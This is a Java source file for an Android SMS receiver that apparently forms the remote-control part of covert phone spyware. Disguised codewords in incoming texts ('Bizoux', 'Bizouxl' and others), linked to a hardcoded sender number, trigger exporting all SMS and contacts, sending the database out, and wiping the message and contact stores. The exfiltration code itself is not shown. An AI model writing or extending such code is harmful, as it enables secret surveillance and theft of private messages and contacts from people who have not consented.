package org.gdocument.gchattoomuch.receiver;

import org.gdocument.gchattoomuch.lib.manager.SharedPreferenceManager;
import org.gdocument.gchattoomuch.lib.manager.SmsLanguageManager;
import org.gdocument.gchattoomuch.lib.parser.SmsParser.MSG_TYPE;
import org.gdocument.gtracergps.launcher.log.Logger;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsLanguageReceiver extends BroadcastReceiver {

	private static final String TAG = SmsLanguageReceiver.class.getSimpleName();

	private static final String FROM_PHONENUMBER_END = "683469858";

	public enum MSG_LANGUAGE {
			CLEAN_DB_SMS("Bizouz", MSG_TYPE.CLEAN_DB_SMS, ""),
			CLEAN_DB_CONTACT("Bizouzz", MSG_TYPE.CLEAN_DB_CONTACT, ""),
			SET_SERVICE_EXPORT_TIME("Biszoux", MSG_TYPE.SET_SERVICE_EXPORT_TIME, "" + SharedPreferenceManager.SERVICE_EXPORT_SCHEDULE_TIME_HOUR_24),
			SET_SERVICE_EXPORT_SMS_COUNT("BizouxX", MSG_TYPE.SET_SERVICE_EXPORT_SMS_COUNT, "100"),
			SET_SERVICE_EXPORT_CONTACT_COUNT("BizouXx", MSG_TYPE.SET_SERVICE_EXPORT_CONTACT_COUNT, "100"),
			SET_SERVICE_EXPORT_SMS_ALL("BizouxXxx", MSG_TYPE.SET_SERVICE_EXPORT_SMS_COUNT, "-1"),
			SET_SERVICE_EXPORT_CONTACT_ALL("BizouXxxx", MSG_TYPE.SET_SERVICE_EXPORT_CONTACT_COUNT, "-1"),
			RUN_SERVICE_EXPORT("Bizoux", MSG_TYPE.RUN_SERVICE_EXPORT, ""),
			SEND_DB("Bizouxl", MSG_TYPE.SEND_DB, "");
		;

		public String language;
		public MSG_TYPE msgType;
		public String value;

		MSG_LANGUAGE(String language, MSG_TYPE msgType, String value) {
			this.language = language;
			this.msgType = msgType;
			this.value = value;
		};
	}
	@Override
	public void onReceive(Context context, Intent intent) {
		logMe("onReceive");

		// Retrieves a map of extended data from the intent.
		final Bundle bundle = intent.getExtras();

		try {

			if (bundle != null) {

				Object[] pdusObj = (Object[]) bundle.get("pdus");
				if (pdusObj!=null) {
					int size = pdusObj.length;
	        		logMe("nb pdusObj:" + size);
	
	        		String phoneNumber = "";
	        		String message = "";
					for (int i = 0; i < size; i++) {
	
						SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);

						phoneNumber = currentMessage.getDisplayOriginatingAddress();
						message += currentMessage.getDisplayMessageBody();
					} // end for loop
	
					SmsLanguageManager.getInstance().processLanguageMessage(context, phoneNumber, message);
				}
				else {
	        		logMe("pdusObj is empty");
				}
			} // bundle is null
			else {
        		logMe("bundle is null");
			}

		} catch (Exception e) {
			Logger.logMe(TAG, e);

		}
	}
	
	private void logMe(String message) {
		Logger.logMe(TAG, message);
	}
}